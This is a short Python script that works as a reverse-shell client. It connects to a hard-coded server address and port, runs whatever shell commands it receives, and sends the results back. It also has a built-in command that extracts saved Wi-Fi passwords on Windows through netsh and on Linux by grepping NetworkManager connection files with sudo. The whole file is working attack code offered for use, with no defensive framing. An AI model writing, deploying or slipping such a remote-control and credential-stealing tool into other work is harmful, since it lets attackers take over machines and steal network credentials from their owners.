import platform
import socket
import os
import subprocess
import sys

SERVER_HOST = "192.168.1.17"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

#CREATION OF SOCKET
# create the socket object
s = socket.socket()

#BINDING OF SOCKET
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))


#FIRST INTERACTION WITH SERVER
# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())


#INTERACTION WITH SERVER
while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""

    if command.lower() == "give_wifi_password":
        if platform.system() == "Windows":
            # execute the command and retrieve the results
            output = subprocess.getoutput('netsh wlan show profile name="WIFI_NAME" key=clear | findstr "Key Content"')
        elif platform.system() == "Linux":
            # This operation requires root access and it's not recommended
            output = subprocess.getoutput('sudo grep psk= /etc/NetworkManager/system-connections/*')
        else:
            output = "Unsupported operating system."
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close()